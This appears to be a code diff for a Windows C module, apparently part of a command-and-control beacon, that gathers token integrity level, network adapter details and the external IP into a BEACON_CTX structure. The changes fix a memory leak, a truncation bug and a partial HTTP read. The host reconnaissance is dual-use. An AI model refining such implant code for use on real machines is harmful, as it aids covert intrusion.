@@ -20,11 +20,13 @@ static void get_integrity_level(BEACON_CTX *ctx) {
     DWORD dwSize = 0;
     GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
     TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)LocalAlloc(LPTR, dwSize);
-    if (tml && GetTokenInformation(hToken, TokenIntegrityLevel, tml, dwSize, &dwSize)) {
-        DWORD level = *GetSidSubAuthority(tml->Label.Sid,
-                        *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
-        ctx->integrity_level = level;
-        ctx->is_elevated     = (level >= SECURITY_MANDATORY_HIGH_RID);
+    if (tml) {
+        if (GetTokenInformation(hToken, TokenIntegrityLevel, tml, dwSize, &dwSize)) {
+            DWORD level = *GetSidSubAuthority(tml->Label.Sid,
+                            *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
+            ctx->integrity_level = level;
+            ctx->is_elevated     = (level >= SECURITY_MANDATORY_HIGH_RID);
+        }
         LocalFree(tml);
     }
     CloseHandle(hToken);
@@ -80,6 +82,7 @@ static void get_adapters(BEACON_CTX *ctx) {
         int elen = snprintf(entry, sizeof(entry),
             "%s{\"name\":\"%s\",\"ip\":\"%s\",\"mac\":\"%s\"}",
             first ? "" : ",", a->Description, ip, mac);
+        if (elen >= (int)sizeof(entry)) elen = (int)sizeof(entry) - 1;
 
         while (off + (size_t)elen + 2 > cap) {
             cap *= 2;
@@ -119,9 +122,17 @@ static void get_external_ip(BEACON_CTX *ctx) {
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
         WinHttpReceiveResponse(hRequest, NULL)) {
-        DWORD dwRead = 0;
-        WinHttpReadData(hRequest, ctx->eip, sizeof(ctx->eip) - 1, &dwRead);
-        ctx->eip[dwRead] = '\0';
+        DWORD total = 0, avail = 0, bread = 0;
+        do {
+            avail = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &avail) || avail == 0) break;
+            DWORD room = (DWORD)(sizeof(ctx->eip) - 1) - total;
+            if (room == 0) break;
+            if (avail > room) avail = room;
+            WinHttpReadData(hRequest, ctx->eip + total, avail, &bread);
+            total += bread;
+        } while (avail > 0);
+        ctx->eip[total] = '\0';
     }
 
     WinHttpCloseHandle(hRequest);
